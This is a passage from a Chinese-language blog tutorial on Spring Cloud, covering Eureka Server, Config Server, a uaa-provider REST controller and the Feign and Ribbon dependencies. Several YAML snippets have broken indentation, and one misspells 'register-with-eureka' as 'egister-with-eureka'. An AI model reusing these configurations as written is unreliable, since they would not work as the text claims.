</code></pre> 
<p>然后，需要在启动类中添加注解 @EnableEurekaServer，声明这个应用是一个Eureka Server，启动类的代码如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>center<span class="token punctuation">.</span>eureka</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>netflix<span class="token punctuation">.</span>eureka<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">EnableEurekaServer</span><span class="token punctuation">;</span>
<span class="token comment">//在启动类中添加注解 @EnableEurekaServer</span>
<span class="token annotation punctuation">@EnableEurekaServer</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EurekaServerApplication</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">EurekaServerApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>然后，在应用配置文件 application.yml 中，对 Eureka Server 的一些参数进行配置。一份基础的配置文件大致如下：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">7777</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> eureka<span class="token punctuation">-</span>server
<span class="token key atrule">eureka</span><span class="token punctuation">:</span>
  <span class="token key atrule">client</span><span class="token punctuation">:</span>
    <span class="token key atrule">register-with-eureka</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
    <span class="token key atrule">fetch-registry</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
    <span class="token key atrule">service-url</span><span class="token punctuation">:</span>
       <span class="token comment">#服务注册中心的配置内容，指定服务注册中心的位置</span>
       <span class="token key atrule">defaultZone</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>SCAFFOLD_EUREKA_ZONE_HOSTS<span class="token punctuation">:</span>http<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>7777/eureka/<span class="token punctuation">}</span>
  <span class="token key atrule">instance</span><span class="token punctuation">:</span>
<span class="token key atrule">hostname</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>EUREKA_ZONE_HOST<span class="token punctuation">:</span>localhost<span class="token punctuation">}</span>
  <span class="token key atrule">server</span><span class="token punctuation">:</span>
    <span class="token key atrule">enable-self-preservation</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token comment"># 开启自我保护</span>
<span class="token key atrule">eviction-interval-timer-in-ms</span><span class="token punctuation">:</span> <span class="token number">60000</span> <span class="token comment"># 扫描失效服务的间隔时间（单位毫秒，默认是60*1000）即60秒</span>

</code></pre> 
<p>以上的配置文件中，包含了三类配置项：作为服务注册中心的配置项（eureka.server.<em>）、作为 Provider 提供者的配置项（eureka.instance.</em>）、作为注册中心客户端组件的配置项（eureka.client.*），至于具体的原因，请参考《SpringCloud Nginx高并发核心编程》一书。</p> 
<p>配置完成后，通过运行启动类 EurekaServerApplication 就可以启动 Eureka Server，然后通过浏览器访问 Eureka Server 的<strong>控制台界面</strong>（其端口为 server.port 配置项的值），大致如下图所示。</p> 
<p><img src="https://images2.imgbox.com/7e/43/y2eDu26V_o.png" alt=""></p> 
<p>图：Eureka Server 的控制台界面</p> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从下面的链接获取：<a href="https://www.yuque.com/crazymakercircle/gkkw8s/khigna" rel="nofollow">语雀</a> 或者 <a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h4><a id="Config__1341"></a>启动Config 配置中心</h4> 
<p>在采用分布式微服务架构的系统中，由于服务数量巨多，为了方便服务配置文件统一管理，所以需要分布式配置中心组件。如果各个服务的配置分散管理，则，上线之后配置的如何保持一致，将会是一个很头疼的问题。</p> 
<p>所以，各个服务的配置定然需要集中管理。SpringCloud Config 配置中心是一个比较好的解决方案。使用SpringCloud Config配置中心，涉及到两个部分：</p> 
<p>（1）config-server 服务端配置；（需要独立运行）</p> 
<p>（2）config-client 客户端配置。 （作为组件嵌入到Provider微服务提供者）</p> 
<h5><a id="configserver__1351"></a>config-server 服务</h5> 
<p>通过SpringCloud 构建一个 config-server 服务，大致需要三步。首先，在pom.xml中引入spring-cloud-config-server 依赖，大致如下：</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-config-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>其次，在所创建的 SpringBoot的程序主类上，添加@EnableConfigServer注解，开启Config Server 服务，代码如下：</p> 
<pre><code class="prism language-java"><span class="token annotation punctuation">@EnableConfigServer</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span>
<span class="token keyword">class</span> <span class="token class-name">Application</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>   
        <span class="token keyword">new</span>  <span class="token class-name">SpringApplicationBuilder</span><span class="token punctuation">(</span><span class="token class-name">Application</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">web</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>第三步，设置属性文件的位置。SpringCloud Config 提供本地存储配置的方式。在bootstrap启动属性文件中，设置属性 spring.profiles.active=native，并且设置属性文件所在的位置，大致如下：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">7788</span>  <span class="token comment">#配置中心端口</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> config<span class="token punctuation">-</span>server   <span class="token comment"># 服务名称</span>
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>
    <span class="token key atrule">active</span><span class="token punctuation">:</span> native   <span class="token comment"># 设置读取本地配置文件</span>
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">config</span><span class="token punctuation">:</span>
      <span class="token key atrule">server</span><span class="token punctuation">:</span>
        <span class="token key atrule">native</span><span class="token punctuation">:</span>
          <span class="token key atrule">searchLocations</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>config/  <span class="token comment">#申明本地配置文件的存放位置</span>
</code></pre> 
<p>配置说明：</p> 
<p>（1）spring.profiles.active=native，表示读取本地配置，而不是从git读取配置。</p> 
<p>（2）search-locations=classpath:config/ 表示查找文件的路径，在类路径的config下。</p> 
<p>服务端的配置规则：在配置路径下，以 {label}/{application}-{profile}.properties 的命令规范，放置对应的配置文件。上面实例，放置了以下配置文件：</p> 
<p>分别对通用配置common、数据库配置db、缓存配置的相关属性，进行设置。Config 配置中心启动之后，使用 http:// ${CONFIG-HOST}: ${CONFIG-PORT}/{application}/{profile}[/{label}] 的地址格式，可以直接访问所加载好的配置属性。</p> 
<p>例如，访问示例中的 http://192.168.233.128:7788/crazymaker/redis/dev 地址，返回的配置信息如下图所示。</p> 
<p><img src="https://images2.imgbox.com/4f/59/GMJtMsu1_o.png" alt=""></p> 
<p><strong>特别说明：SpringCloud config-server 支持有多种配置方式，比如 Git，native，SVN 等</strong>。虽然官方建议使用Git方式进行配置，这里没有重点介绍 Git方式，而是使用了本地文件的方式。有三个原因：</p> 
<p>（1） 对于学习或者一般的开发来说，本地的文件的配置方式更简化；</p> 
<p>（2） <strong>生产环境建议使用 Nacos，集成注册中心和配置中心，更加方便和简单</strong>；</p> 
<h4><a id="_1419"></a>微服务入门案例</h4> 
<p>在本书的配套源码 crazy-springcloud 脚手架中，设计三个 Provider 服务提供者：uaa-provider （用户账号与认证）、demo-provider （演示用途）、seckill-provider （秒杀服务），具体如下图所示。</p> 
<p><img src="https://images2.imgbox.com/7b/27/kDwCzoqx_o.png" alt=""></p> 
<p>图：本书的配套源码中的服务提供者</p> 
<h4><a id="uaaprovider__1430"></a>uaa-provider 微服务提供者</h4> 
<p>首先，一个 Provider 服务提供者至少需要以下两个组件包依赖：SpringBoot WEB 服务组件、Eureka Client 客户端组件，大致如下：</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--SpringBoot WEB 服务组件 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

    <span class="token comment">&lt;!-- Eureka Client 客户端组件 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-netflix-eureka-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>SpringBoot WEB 服务组件用于提供 REST 接口服务，Eureka Client 客户端组件用于服务注册与发现。从以上的 Maven 依赖可以看出，在 SpringCloud 技术体系中，一个 Provider 服务提供者首先是一个 SpringBoot 应用，所以，在学习 SpringCloud 微服务技术之前，必须具备一些基本的 SpringBoot 开发知识。<br> 然后，在 SpringBoot 应用的启动类上加上 @EnableDiscoveryClient 注解，用于启用 Eureka Client 客户端组件，启动类的代码如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>start</span><span class="token punctuation">;</span>
<span class="token comment">//...省略import</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token comment">/*
 *  启用 Eureka Client 客户端组件
 */</span>
<span class="token annotation punctuation">@EnableEurekaClient</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UAACloudApplication</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">UAACloudApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>接下来，在 Provider 模块（或者项目）的 src/main/resources 的 bootstrap 启动属性文件中（bootstrap.properties或bootstrap.yml），增加 Provider 实例相关的配置，具体如下：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> uaa<span class="token punctuation">-</span>provider

<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">7702</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
      <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /uaa<span class="token punctuation">-</span>provider
<span class="token key atrule">eureka</span><span class="token punctuation">:</span>
  <span class="token key atrule">instance</span><span class="token punctuation">:</span>
    <span class="token key atrule">instance-id</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>spring.cloud.client.ip<span class="token punctuation">-</span>address<span class="token punctuation">}</span><span class="token punctuation">:</span>$<span class="token punctuation">{<!-- --></span>server.port<span class="token punctuation">}</span>
    <span class="token key atrule">ip-address</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>spring.cloud.client.ip<span class="token punctuation">-</span>address<span class="token punctuation">}</span>
    <span class="token key atrule">prefer-ip-address</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token comment">#访问路径优先使用 IP地址</span>
    <span class="token key atrule">status-page-url-path</span><span class="token punctuation">:</span> /$<span class="token punctuation">{<!-- --></span>server.servlet.context<span class="token punctuation">-</span>path<span class="token punctuation">}</span>$<span class="token punctuation">{<!-- --></span>management.endpoints.web.base<span class="token punctuation">-</span>path<span class="token punctuation">}</span>/info     
    <span class="token key atrule">health-check-url-path</span><span class="token punctuation">:</span> /$<span class="token punctuation">{<!-- --></span>server.servlet.context<span class="token punctuation">-</span>path<span class="token punctuation">}</span>$<span class="token punctuation">{<!-- --></span>management.endpoints.web.base<span class="token punctuation">-</span>path<span class="token punctuation">}</span>/health 
<span class="token key atrule">client</span><span class="token punctuation">:</span>
    <span class="token key atrule">egister-with-eureka</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token comment">#注册到eureka服务器</span>
    <span class="token key atrule">fetch-registry</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>       <span class="token comment">#是否去注册中心获取其他服务</span>
    <span class="token key atrule">serviceUrl</span><span class="token punctuation">:</span>
      <span class="token key atrule">defaultZone</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>EUREKA_ZONE_HOST<span class="token punctuation">:</span>localhost<span class="token punctuation">}</span><span class="token punctuation">:</span>7777/eureka/
</code></pre> 
<p>在详细介绍上面的配置项之前，先启动一下 Provider 的启动类， 控制台的日志大致如下：</p> 
<pre><code>...com.netflix.discovery.DiscoveryClient - DiscoveryClient_UAA-PROVIDER/192.168.233.128:7702: registering service...
....
...com.netflix.discovery.DiscoveryClient - DiscoveryClient_UAA-PROVIDER/192.168. 233.128:7702 - registration status: 204
</code></pre> 
<p>如果看到上面的日志，表明 Provider 实例已经启动成功。可以进一步通过 Eureka Server 检查服务是否注册成功：打开 Eureka Server 的控制台界面，可以看到 uua-provider 的一个实例已经成功注册，具体如下图所示。</p> 
<p><img src="https://images2.imgbox.com/f0/00/MngFkJEw_o.png" alt=""></p> 
<p>图：uua-provider 实例已经在成功注册到 Eureka Server</p> 
<p>前面讲到，SpringCloud 中一个 Provider 实例身兼两者角色：Provider 服务提供者、注册中心客户端。所以，在 Provider 的配置文件中，包含了两类配置： Provider 实例角色的相关配置、Eureka Client 客户端角色的相关配置。<br> 有关的Provider 实例角色的相关配置，请参考《SpringCloud Nginx高并发核心编程》一书。</p> 
<h5><a id="uaaprovider_Rest_1514"></a>uaa-provider 实现一个Rest接口</h5> 
<p>以 uaa-Provider的 获取用户信息接口为例，进行介绍，</p> 
<p>这里实现一个获取用户信息的接口 /api/user/detail/v1 ，该接口的具体的代码，在uaa-Provider模块中，如下图所示：</p> 
<p><img src="https://images2.imgbox.com/c1/61/7Z5dhkXL_o.png" alt=""></p> 
<p>具体的代码如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">FrontUserEndSessionServiceImpl</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Api</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>password<span class="token punctuation">.</span></span><span class="token class-name">PasswordEncoder</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span><span class="token punctuation">;</span>


<span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"用户信息、基础学习DEMO"</span><span class="token punctuation">,</span> tags <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"用户信息、基础学习DEMO"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/api/user"</span> <span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span>
<span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">FrontUserEndSessionServiceImpl</span> userService<span class="token punctuation">;</span>
    <span class="token comment">/**
     * 注入全局的加密器
     */</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token class-name">PasswordEncoder</span> passwordEncoder<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/detail/v1"</span> <span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"获取用户信息"</span> <span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">UserDTO</span> dto <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">==</span> dto<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token class-name">RestOut</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"没有找到用户"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">RestOut</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>dto<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setRespMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/passwordEncoder/v1"</span> <span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"密码加密"</span> <span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">passwordEncoder</span><span class="token punctuation">(</span>
            <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"raw"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> raw<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>

<span class="token comment">//        passwordEncoder = PasswordEncoderFactories.createDelegatingPasswordEncoder();</span>
        <span class="token class-name">String</span> encode <span class="token operator">=</span> passwordEncoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">RestOut</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="uaaprovider_1586"></a>uaa-provider的运行结果</h5> 
<p><img src="https://images2.imgbox.com/04/5a/phS9yA7b_o.png" alt=""></p> 
<p>获取用户信息：</p> 
<p><img src="https://images2.imgbox.com/7e/70/m7rBisud_o.png" alt=""><br> <img src="https://images2.imgbox.com/7c/29/72L8OoFf_o.png" alt=""></p> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从下面的链接获取：<a href="https://www.yuque.com/crazymakercircle/gkkw8s/khigna" rel="nofollow">语雀</a> 或者 <a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h4><a id="demoprovider_RPC_1599"></a>demo-provider 完成RPC远程调用</h4> 
<p>demo-provider 使用 Feign+Ribbon 进行 RPC 远程调用时，对每一个Java 远程调用接口，Feign 都会生成了一个 RPC远程调用客户端实现类，只是，该实现类对于开发者来说是透明的，开发者感觉不到这个类的存在。</p> 
<p>需要在 Maven 的pom文件中，增加以下Feign+Ribbon 集成模块的依赖：</p> 
<pre><code class="prism language-xml"> <span class="token comment">&lt;!--导入 SpringCloud Ribbon --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-netflix-ribbon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!--添加Feign依赖--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-openfeign<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>客户端 RPC 实现类位于远程调用 Java 接口和服务提供者 Provider 之间，承担了以下职责：</p> 
<p>（1）拼装 REST 请求：根据 Java 接口的参数，拼装目标 REST 接口的 URL；</p> 
<p>（2）发送请求和获取结果：通过 Java HTTP 组件（如 HttpClient）调用服务提供者 Provider 的 REST 接口，并且获取 REST 响应；</p> 
<p>（3）结果解码：解析 REST 接口的响应结果，封装成目标 POJO 对象（Java 接口的返回类型），并且返回。</p> 
<h5><a id="REST_1633"></a>REST服务的本地代理接口</h5> 
<p>该接口的具体的代码，在<strong>uaa-client模块</strong>中，如下图所示：<br> <img src="https://images2.imgbox.com/93/fe/t4cOTcsI_o.png" alt=""></p> 
